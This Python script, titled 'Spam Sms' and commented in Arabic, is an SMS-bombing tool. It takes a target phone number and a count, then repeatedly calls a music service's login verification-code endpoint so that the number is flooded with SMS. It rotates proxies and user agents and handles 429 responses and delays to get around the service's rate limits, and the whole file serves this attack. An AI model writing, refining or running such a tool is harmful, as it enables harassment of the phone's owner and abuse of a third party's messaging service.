import requests
import json
import random
import time
from pyfiglet import Figlet
from termcolor import colored
from datetime import datetime
import rich

# إعدادات الألوان
RESET_COLOR = "\033[0m"
YELLOW = "\033[1;33m"
GREEN = "\033[1;32m"
RED = "\033[1;31m"
CYAN = "\033[1;36m"
BLUE = "\033[1;34m"

# واجهة البداية
f = Figlet(font='slant')
print(f"{YELLOW}{f.renderText('Spam Sms')}{RESET_COLOR}")
v = ("-" * 60)
dev = ("𝑫𝒆𝒗 : @A_Y_TR | Modified for Mahmoud")
print(dev)
print(v)

# قوائم البروكسي و User-Agents
# ملاحظة: يفضل تحديث هذه القائمة ببروكسيات تعمل (Live) للحصول على أفضل نتيجة
proxies = [
    {"http": "http://123.456.789.0:8080"},
    {"http": "http://98.765.432.1:3128"},
    {"http": "http://192.168.0.1:1080"},
    {'http': 'http://3.71.96.137:8090'},
    {'http': 'http://49.13.173.87:8081'},
    {'http': 'http://49.12.235.70:8081'},
    {'http': 'http://49.12.235.70:80'},
    {'http': 'http://49.13.173.87:80'},
    {'http': 'http://116.202.121.34:3128'},
    {'http': 'http://20.210.113.32:8123'},
    {'http': 'http://8.219.97.248:80'},
    {"socks4": "socks4://148.72.215.230:55327"},
    {"socks4": "socks4://37.59.213.49:56887"},
    {"socks4": "socks4://200.46.30.210:4153"}
]

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"
]

print("\033[1;37m")
number = input("Enter Your Number: ")

print("\033[1;37m")
sms_count = input("Enter number of messages: ")
print("\033[1;31m")
print(v)

url = "https://api.twistmena.com/music/Dlogin/sendCode"
payload = json.dumps({"dial": f"2{number}"})

success_count = 0
failure_count = 0

for i in range(int(sms_count)):
    current_attempt = i + 1
    proxy = random.choice(proxies)
    user_agent = random.choice(user_agents)
    
    headers = {
        'User-Agent': user_agent,
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json",
        'app_version': "10.10.10",
        'platform': "android",
        'accept-language': "ar",
    }

    print(f"{CYAN}[Attempt {current_attempt}]{RESET_COLOR} Sending...", end="\r")

    try:
        response = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=8)
        
        # --- نظام معالجة الحظر الذكي ---
        if response.status_code == 429:
            print(f"{YELLOW}⚠️  Too Many Requests (429). Server is angry!{RESET_COLOR}")
            print(f"{BLUE}❄️  Cooling down for 60 seconds...{RESET_COLOR}")
            time.sleep(60) # انتظار طويل لفك الحظر المؤقت
            failure_count += 1
            continue # الانتقال للمحاولة التالية فوراً بعد الانتظار
            
        elif response.status_code == 200:
            try:
                data = response.json()
                if "responseHeader" in data and "status" in data["responseHeader"]:
                    print(f"{GREEN}✔ SUCCESS: Message Sent{RESET_COLOR}                      ")
                    success_count += 1
                else:
                    print(f"{RED}✖ Failed: Unknown Response{RESET_COLOR}                     ")
                    failure_count += 1
            except json.JSONDecodeError:
                print(f"{RED}✖ Failed: Not JSON (Server Error){RESET_COLOR}                ")
                failure_count += 1
        else:
            print(f"{RED}✖ Blocked/Failed (Status {response.status_code}){RESET_COLOR}              ")
            failure_count += 1

    except Exception as e:
        print(f"{RED}✖ Connection Error (Proxy/Net){RESET_COLOR}                        ")
        failure_count += 1

    # تأخير ذكي عشوائي (أبطأ لتجنب الحظر)
    sleep_time = random.uniform(5, 10)
    time.sleep(sleep_time)

# النتائج النهائية
print("\n" + v)
print(f"{GREEN}Total Success: {success_count}{RESET_COLOR}")
print(f"{RED}Total Failed : {failure_count}{RESET_COLOR}")
print(v)
f_end = Figlet(font='small')
print(colored(f_end.renderText("Done"), 'white', 'on_blue'))